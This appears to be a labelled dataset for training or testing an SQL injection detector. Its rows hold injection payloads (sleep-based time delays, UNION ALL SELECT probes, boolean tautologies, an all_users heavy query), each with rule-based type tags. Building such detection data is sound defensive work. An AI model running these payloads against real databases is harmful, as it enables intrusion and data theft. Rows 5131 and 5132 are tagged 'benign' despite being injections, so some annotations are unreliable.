row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5130,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 4982 = 4982,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5131,select ( case when ( 3499 = 4209 ) then 3499 else 3499* ( select 3499 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5132,select ( case when ( 1776 = 7688 ) then 1776 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5133,select sleep ( 5 ) and ( ( 8679 = 8679,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5134,"-1823 where 6852 = 6852 union all select 6852,6852,6852,6852,6852,6852#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5135,-9708' where 8150 = 8150 or 6872 = 6872--,1,,boolean_blind,generic,0.95,8150 = 8150 or detected — boolean_blind injection (priority 8) on generic,rule-based
5136,"-2639"" ) where 1494 = 1494 union all select 1494--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5137,"-3037"" ) ) ) or elt ( 4758 = 9129,9129 ) and ( ( ( ""zewv"" like ""zewv",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
5138,"-4825%' ) union all select 6804,6804,6804,6804,6804,6804,6804--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5139,"1"" where 2221 = 2221 and 5318 = 8398--",1,,boolean_blind,generic,0.95,2221 = 2221 and detected — boolean_blind injection (priority 8) on generic,rule-based
5140,"1"" ) ) ) and elt ( 1750 = 7826,7826 ) and ( ( ( ""qcro"" = ""qcro",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5141,-7742 ) as tgzq where 7842 = 7842 or 2062 = 1563,1,,boolean_blind,generic,0.95,7842 = 7842 or detected — boolean_blind injection (priority 8) on generic,rule-based
5142,"1' ) ) as babx where 2494 = 2494 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
5143,"1'+ ( select wkay where 5476 = 5476 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) +'",1,,boolean_blind,generic,0.95,5476 = 5476 and detected — boolean_blind injection (priority 8) on generic,rule-based
